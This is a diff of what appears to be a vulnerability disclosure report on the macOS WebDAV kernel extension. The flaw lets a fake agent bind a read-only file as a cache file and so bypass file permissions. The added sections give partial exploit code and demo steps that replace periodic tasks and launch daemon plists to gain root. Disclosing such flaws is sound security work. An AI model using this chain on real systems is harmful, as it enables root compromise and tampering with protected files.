@@ -1,6 +1,6 @@
 # Title
 
-Vulnerability in WebDAV kernel extension may allow a malicious application to bypass read only or write only restriction enforced on a file by file system
+Lack of validation in WebDAV kernel extension when handling sysctl requests for associating cache files may allow a malicious application to bypass read only or write only restriction enforced on a file by file system
 
 # Summary
 
@@ -9,20 +9,6 @@ WebDAV (Web-based Distributed Authoring and Versioning) protocol allows users to
 When a file in WebDAV mount is opened, a cache file is associated to that file. This cache file is created by the agent process. Agent process calls `sysctl` syscall with file descriptor of opened cache file to associate a cache file with a file in WebDAV mount. The `sysctl` syscall is handled by function `webdav_sysctl` implemented [here](https://todo) in kext. The current implementation directly associates the `vnode` pointer of received file descriptor to the file in WebDAV mount, without validating whether the received file descriptor of cache file is authorized for read and write operation. When writing data to a file in WebDAV mount, the data is first written to cache file by kext. The data is then read by agent and send to WebDAV server.
 
 This lack of validation can be exploited by a malicious application to bypass read only or write only restriction enforced on a file by file system by making the WebDAV kext to do the task for it. For example to bypass read only restriction on `protected.txt` file, the malicious application will create a fake WebDAV agent. The fake agent will then create a WebDAV mount by calling `mount` syscall with appropriate arguments. The arguments will include the address of socket to which the kext should connect to. In this case the kext will be connecting to unix domain socket served by the fake agent. Lets say the fake agent creates the mount at `/Volumes/localhost`. The fake agent will then craft responses to kext is such a way that the target file `protected.txt` will be associated as cache file of a file inside mount, lets say`/Volumes/localhost/portal`. Kext will write the data written to `/Volumes/localhost/portal` to the associated cache file `protected.txt`.  Now the malicious application can write to the unrestricted file `/Volumes/localhost/portal` to write data to read only restricted `protected.txt`, bypassing file system permission restrictions.
-
-# Impact
-
-1. Privilege escalation
-   
-   1. Code execution with root privilege - See POC #1 and #2
-   
-   2. Code execution with different user privilege - See POC #3
-
-2. Malicious actors like ransomware may exploit this vulnerability to tamper read only files - See POC #4
-
-3. Malicious application can access confidential data from read protected files - See POC #6
-
-4. Might be possible to do code execution in kernel context by replacing current version of kernel extension with old vulnerable version
 
 # Exploitability
 
@@ -39,6 +25,18 @@ For this exploit to work, the fake WebDAV agent should be able to open file desc
 ##### To read data from target file
 
 1. Running user should have write permission to target file
+
+**Note:** Except SIP, other limitations can be circumvented by acquiring root priveleges. See POC #1 and #2 for acquiring root privilege using this exploit
+
+# Impact
+
+1. This exploit can be used to achieve privilege escalation and run commands in root user context. See demo [#1](#replacing-periodic-tasks) and [#2](#replacing-periodic-tasks)
+
+2. Malicious actors like ransomware may exploit this vulnerability to tamper read only files without running as root - See [demo](#overwrite-read-only-file)
+
+3. Malicious application can access confidential data from read protected files without running as root - See [demo](#read-write-only-file)
+
+4. Theoretically possible to do code execution in kernel context by replacing current version of a kernel extension with old vulnerable version which is not blacklisted in `AppleKextExcludeList.kext`
 
 # Demo
 
@@ -89,6 +87,52 @@ The following steps will demonstrate writing on a protected file `secure.txt` by
    
    Running above command will output `Tampered!`
 
+##### Acquiring root privelege
+
+Scripts used below are available at `poc` directory.
+
+###### Replacing periodic tasks
+
+1. Deploy payload `exploit_periodic_payload` by running
+   
+   ```bash
+   bash ./exploit_periodic.sh
+   ```
+   
+   Note: This script will replace `/etc/periodic/daily/110.clean-tmps` with modified `exploit_periodic_payload` file which will execute command `echo "executing as $EUID" > /tmp/exploit_periodic.txt` when daily periodic tasks are run
+
+2. Daily periodic tasks are run at predefined schedule. To trigger them immediatly for demo, run
+   
+   ```bash
+   sudo periodic daily
+   ```
+   
+   This will create `/tmp/exploit_periodic.txt` containing text`executing as 0` showing that the modified payload was run as root.
+
+3. To restore original `/etc/periodic/daily/110.clean-tmps` run
+   
+   ```bash
+   bash ./restore_periodic.sh
+   ```
+
+###### Replacing launch daemon plist
+
+1. For this exploit to work, atleast one launch daemon plist must be present in `/Library/LaunchDaemons` directory.  Run `exploit_launchd.sh`
+   
+   ```bash
+   bash ./exploit_launchd.sh
+   ```
+   
+   **Note:** `exploit_launchd.sh` script will modify a launch daemon plist to run command`sh -c "echo $EUID > /tmp/exploit_launchd.txt"`
+
+2. Restart system to run the modified launch daemon plist.  File `/tmp/exploit_launchd.txt` will be created with content `0` 
+
+3. To restore original launch daemon plist, run
+   
+   ```bash
+   bash ./restore_launchd.sh
+   ```
+
 ##### Read write only file
 
 1. Create a file named `secure_log.txt` in `HOME` directory
@@ -132,171 +176,226 @@ The following steps will demonstrate writing on a protected file `secure.txt` by
    
    Above command will output `confidential`
 
-# Technical Details
+# Working
 
-WebDAV filesystem for MacOS have two main components - WebDAV agent and WebDAV kernel extension (kext). WebDAV agent is a process running in user space. It is responsible for connecting with and processing response from WebDAV server. WebDAV kext is a kernel extension which implements the virtual file system interface and connects with WebDAV agent via unix domain socket for performing file system operations. The isolation between kext and agent process reduces the impact of bugs susceptible to malicious responses from server.
+The following example explains how a malicious app can exploit the before mentioned vulnerability to overwrite a read only file, lets say `/etc/zprofile`. 
 
-For each vnode in WebDAV filesystem, there is a cache file associated with it. For IO operations (including read and write), instead of sending data over unix domain socket (UDS) the data is written to a cache file on sender side and the receiver side reads the data from cache file. The cache file is created by the agent process. The agent process opens the associated cache file and sends allocated file descriptor to kext. In kext side, there is no validation to ensure that the received file descriptor is authorized for read and write operations. The kext calls `file_vnode_withvid` function to obtain `vnode` pointer associated to cache file. Read and write IO operations on cache file uses  `VNOP_READ` and `VNOP_WRITE` functions respectively. Hence even if the file descriptor send by agent is not authorized for write operation, kext can successfully perform write operations on the cache file. Any read / write operation on node will happen through the associated to cache file. Hence by creating a fake WebDAV agent which responds to request from kext, a malicious application running in standard user context can perform IO operations on a file even if the filesystem permissions does not allow that operation.
+1. Malicious app start a fake WebDAV agent. Fake agent creates and listen on a unix domain socket, at say `/tmp/.portal/socket`
 
-Consider a WebDAV mount at `/Volumes/localhost`. Let the mount contains a file `portal` at root directory. When a process opens and writes to the file `portal`, the simplified communication between kext and agent process is as follows (only communication relevant to this exploit is mentioned for simplicity)
-
-1. Kext sends a request with agent process with following data
+2. Malicious app then calls `mount` syscall which can be executed in standard user context to mount WebDAV FS.
    
    ```c
-   struct webdav_request_open
-   {
-     /* user and groups */
-     struct webdav_cred pcr;
-     /* opaque_id of object */
-     opaque_id obj_id;
-     /* file access flags (O_RDONLY, O_WRONLY, etc.) */
-     int flags;
-     /* the reference to the webdav object that the cache object should be associated with */
-     int ref;
-   };
-   ```
+   /* Opaque ID of mount root directory */
+   #define ROOT_DIR_ID CreateOpaqueID(1, 1)
+   /* Inode of mount root directory */
+   #define ROOT_DIR_INO WEBDAV_ROOTFILEID
    
-   Fields relevant to exploit in above request are `obj_id` and `ref`. The `obj_id` is a unique id assigned to each node (file / directory) in WebDAV mount. The `obj_id` is used by agent to obtain data structure assigned to node
-
-2. The agent process will use `obj_id` to get reference to `node_entry` data structure associated with the file. The `node_entry` data structure holds important data related to node. 
+   struct sockaddr_un un;
+   bzero(&un, sizeof(un));
+   strlcpy(un.sun_path, "/tmp/.portal/socket", sizeof(un.sun_path));
+   /* set other sockaddr_un fields */
+   ...
    
-   ```c
-   struct node_entry
-   {
-     /* the utf8 name */
-     char *name;
-     ...
-     /* the cache file's file descriptor or -1 if none */
-     int file_fd;
-     ...
-   };
-   ```
+   struct webdav_args args;
+   bzero(&args, sizeof(args));
    
-   The field we are interested in is `file_fd` which contains the file descriptor of cache file associated with the node. If at the time of open, the node does not have a associated cache file, a new cache file is created in `/tmp` directory.  The agent the calls the `sysctl` syscall as follows
+   args.pa_socket_name = (struct sockaddr *)un;
+   args.pa_root_id = ROOT_DIR_ID;
+   args.pa_root_fileid = ROOT_DIR_INO;
+   /* other arguments */
+   ...  
    
-   ```c
-   int mib[5];
-   
-   /* setup mib for the request */
-   mib[0] = CTL_VFS;
-   mib[1] = g_vfc_typenum;
-   mib[2] = WEBDAV_ASSOCIATECACHEFILE_SYSCTL;
-   
-   /* reference id to the webdav object */
-   /* obtained from kext request webdav_request_open */
-   mib[3] = ref;
-   /* cache file's file descriptor */
-   mib[4] = fd;
-   
-   sysctl(mib, 5, NULL, NULL, NULL, 0)
+   mount("webdav", "/tmp/.portal/mount", MNT_ASYNC | MNT_LOCAL | MNT_UNION, &args);
    ```
 
-3. This syscall will trigger `webdav_sysctl` function in `webdav_vfsops.c`
+3. Malicious app then opens `/tmp/.portal/mount/portal` file inside WebDAV FS for writing by making `open` syscall. 
    
-   ```c
-   static int webdav_sysctl(int *name, u_int namelen, user_addr_t oldp, size_t *oldlenp,
-       user_addr_t newp, size_t newlen, vfs_context_t context)
-   {
-     switch ( name[0] )
-     {
-       case WEBDAV_ASSOCIATECACHEFILE_SYSCTL:
-         {
-           int ref;
-           int fd;
-           struct open_associatecachefile *associatecachefile;
-           vnode_t vp;   
+   1. The kernel will first lookup for file with name `portal` inside root directory by calling `webdav_vnop_lookup` of WebDAV kext implemented at [webdav_vnops.c](). The kext will send following request to fake agent to complete lookup
+      
+      ```c
+      struct webdav_request_lookup request;
+      /* Opaque id of root directory */
+      request.dir_id = ROOT_DIR_ID;
+      request.name = "portal";
+      request.name_length = strlen("portal");
+      /* Set other fields */
+      ...
+      
+      /* send request to agent */
+      ```
    
-           /* Use ref to get reference to associatecachefile */
-           webdav_translate_ref(ref, &associatecachefile);     
+   2. Fake agent will respond to request with
+      
+      ```c
+      struct webdav_reply_lookup reply
+      
+      /* opaque id of portal file */
+      reply.obj_id = PORTAL_FILE_ID;
+      /* inode of portal file */
+      reply.obj_fileid = PORTAL_FILE_INO;
+      /* set portal node type as FILE */
+      reply.obj_type = WEBDAV_FILE_TYPE;
+      
+      /* size of target file */
+      reply.obj_filesize = stat.st_size;
+      /* set other fields to stat of target file */
+      ...
+      ```
+      
+      WebDAV kext will use this response to send lookup response to kernel
    
-           ref = name[1];
-           fd = name[2];
-           
-           file_vnode_withvid(fd, &vp, NULL);
+   3. The kernel will then open the `portal` file by calling `webdav_vnop_open` of WebDAV kext implemented at [webdav_vnops.c](). WebDAV kext will send `open` request to WebDAV agent with following data
+      
+      ```c
+      struct webdav_request_open request;
+      /* opaque id of portal file */
+      request.obj_id = PORTAL_FILE_ID;
+      
+      struct open_associatecachefile associatecachefile;
+      associatecachefile.pid = 0;
+      associatecachefile.cachevp = NULLVP;
+      
+      /* Store the pointer to associatecachefile in webdav_ref_table */
+      /* and save the index at which it was stored in request.ref */
+      /* Later on pointer to associatecachefile can be obtained */
+      /* if ref is known */
+      webdav_assign_ref(&associatecachefile, &request.ref);
+      
+      /* set other fields and send request to agent  */
+      ...
+      ```
    
-           /* store the cache file's vnode in the webdavnode */
-           associatecachefile->cachevp = vp;
+   4. To serve `open` request, WebDAV agent first associate a cache file to the file in WebDAV mount. The fake WebDAV agent created by malicious app will associate the target file as cache of `portal` file by making following `sysctl` syscall.
+      
+      ```c
+      /* open target file in read-only mode to get file descriptor */
+      int target_fd = open('/etc/zprofile', O_RDONLY);
+      
+      int mib[5];
+      
+      /* setup mib for the request */
+      mib[0] = CTL_VFS;
+      mib[1] = g_vfc_typenum;
+      mib[2] = WEBDAV_ASSOCIATECACHEFILE_SYSCTL;
+      /* index in webdav_ref_table where pointer to associatecachefile  is saved*/
+      /* obtained from kext request webdav_request_open */
+      mib[3] = request.ref;
+      /* file descriptor to target file */
+      mib[4] = target_fd;
+      
+      sysctl(mib, 5, NULL, NULL, NULL, 0)
+      ```
    
-           /* store the PID of the process that called us */
-           /* for validation in webdav_open */
-           associatecachefile->pid = vfs_context_pid(context);
-           ...
-         }
-       ...
-     }
-   }
-   ```
+   5. Kernel upon receiving this `sysctl` syscall will use `mib[0]` and `mib[1]` to route the request to `webdav_sysctl` function implemented in [webdav_vfsops.c]()
+      
+      ```c
+      static int webdav_sysctl(int *name, u_int namelen, user_addr_t oldp, size_t *oldlenp, user_addr_t newp, size_t newlen, vfs_context_t context)
+      {
+       switch (name[0])
+       {
+         case WEBDAV_ASSOCIATECACHEFILE_SYSCTL:
+           {
+            int ref;
+            int fd;
+            struct open_associatecachefile *associatecachefile;
+            vnode_t vp;
+      
+            ref = name[1];
+            fd = name[2];
+      
+            /* Use ref to get reference to associatecachefile */
+            webdav_translate_ref(ref, &associatecachefile);
+      
+            /* Obtain the reference to vnode of file descriptor fd */
+            /* from the calling process */
+            file_vnode_withvid(fd, &vp, NULL);
+      
+            /* store the cache file's vnode in the webdavnode */
+            associatecachefile->cachevp = vp;
+      
+            /* store the PID of the process that called us */
+            /* for validation in webdav_open */
+            associatecachefile->pid = vfs_context_pid(context);
+            ...
+          }
+        ...
+        }
+      }
+      ```
+      
+      Since there is no validation to make sure that the file descriptor of cache file, `fd` is authorized for read and write, sending the read only file descriptor to target file will be accepted.
    
-   **Note:** There is no validation to ensure that the received file descriptor `fd` is authorized for read and write operations. 
+   6. The WebDAV agent then sends response to kext with following data
+      
+      ```c
+      struct webdav_reply_open reply;
+      reply.pid = getpid();
+      
+      /* send reply to kext */
+      ```
+   
+   7. The kext will then associate the reference to `vnode` of received file descriptor which is the reference to `vnode` of target file as cache file of `portal` file
+      
+      ```c
+      vnode_t vp;
+      vp = ap->a_vp;
+      pt = VTOWEBDAV(vp);
+      
+      struct webdav_request_open request;
+      /* opaque id of portal file */
+      request.obj_id = PORTAL_FILE_ID;
+      struct open_associatecachefile associatecachefile;
+      associatecachefile.pid = 0;
+      associatecachefile.cachevp = NULLVP;
+      /* Store the pointer to associatecachefile in webdav_ref_table */
+      /* and save the index at which it was stored in request.ref */
+      /* Later on pointer to associatecachefile can be obtained */
+      /* if ref is known */
+      webdav_assign_ref(&associatecachefile, &request.ref);
+      
+      /* request sending and other instructions */
+      ...
+      
+      /* Make sure the cache file was associated by correct agent */
+      if (reply_open.pid != associatecachefile.pid)
+      {
+        error = EPERM;
+        goto dealloc_done;
+      }
+      
+      /* Associates target file vode as cache file of portal */
+      pt->pt_cache_vnode = associatecachefile.cachevp;
+      
+      ...
+      ```
 
-4. The agent will the send response to kext with following data
-   
-   ```c
-   struct webdav_reply_open
-   {
-     /* process ID of file system daemon (for matching to ref's pid) */
-     pid_t pid;
-   };
-   ```
-
-5. Kext will read the response from agent and save the associated cache file `vnode` pointer to `webdav_vnode` data associated to the node
-   
-   ```c
-   static int webdav_vnop_open_locked(struct vnop_open_args *ap)
-   {
-     struct webdavnode *pt;
-     vnode_t vp;
-     vp = ap->a_vp;
-     pt = VTOWEBDAV(vp);
-   
-     // For simplicity, request sending and 
-     // related instructions not shown
-     ...
-   
-     if (reply_open.pid != associatecachefile.pid)
-     {
-       error = EPERM;
-       goto dealloc_done;
-     }
-   
-     pt->pt_cache_vnode = associatecachefile.cachevp;
-   
-     ...
-   }
-   ```
-
-6. When data is written to a node in WebDAV mount, the kext will write the data to cache node first
+4. Now the malicious app have file descriptor to `portal` file with read and write capability. When the malicious app writes data to `portal` file, the kernel will call the `webdav_vnop_write` function in WebDAV kext implemented in [webdav_nvops.c]()
    
    ```c
    static int webdav_vnop_write(struct vnop_write_args *ap)
    {
-     struct webdavnode *pt;
-     pt = VTOWEBDAV(ap->a_vp);    
-     vp = ap->a_vp;
+    struct webdavnode *pt;
+    pt = VTOWEBDAV(ap->a_vp);
+    vp = ap->a_vp;
+    ...
+    cachevp = pt->pt_cache_vnode;
+    in_uio = ap->a_uio;
    
-     ...
+    /* Write data to cache file first */
+    VNOP_WRITE(cachevp, in_uio, 0, ap->a_context);
+    VATTR_INIT(&vattr);
+    VATTR_SET(&vattr, va_data_size, uio_offset(in_uio));
    
-     cachevp = pt->pt_cache_vnode;
-     in_uio = ap->a_uio;
+    /* Update size of cache file */
+    vnode_setattr(cachevp, &vattr, ap->a_context);
    
-     /* Write data to cache file first */
-     VNOP_WRITE(cachevp, in_uio, 0, ap->a_context);
-   
-     VATTR_INIT(&vattr);
-     VATTR_SET(&vattr, va_data_size, uio_offset(in_uio));
-     /* Update size of cache file */
-     vnode_setattr(cachevp, &vattr, ap->a_context);
-   
-     // Code for sending request to agent containing data size and offset
-     // Agent will read the data of give size from cache file at
-     // give offset and send it to webdav server 
-     ...  
+    // send request to agent containing data size and offset
+    // fake agent will simple respond success to this request
+    ...
    }
    ```
-
-7. The lack of validation in step 3 by kext can be exploited to perform unauthorized IO operations on a file. Consider a file `/etc/zprofile` in standard MacOS installation. The permissions for this file is `-r--r--r--` which prevents write access to all .  A malicious agent process running in standard user context can open the `zprofile` file for reading. Hence it can obtain file descriptor to that file using `open` syscall. If the malicious agent process sends the file descriptor to `zprofile` in step 2 `sysctl` syscall, the kext will associate the cache file to file named `portal` in root of WebDAV mount. Hence writing data to `portal` file will write data to `zprofile` profile.
-
-Same process can be used to read data from a write only file.
+   
+   The WebDAV kext will first write the data to cache file by `VNOP_WRITE` function with pointer to `vnode` of target file. This will write the data to target file even thought the malicious app did not have write access to target file
 
 # References
 
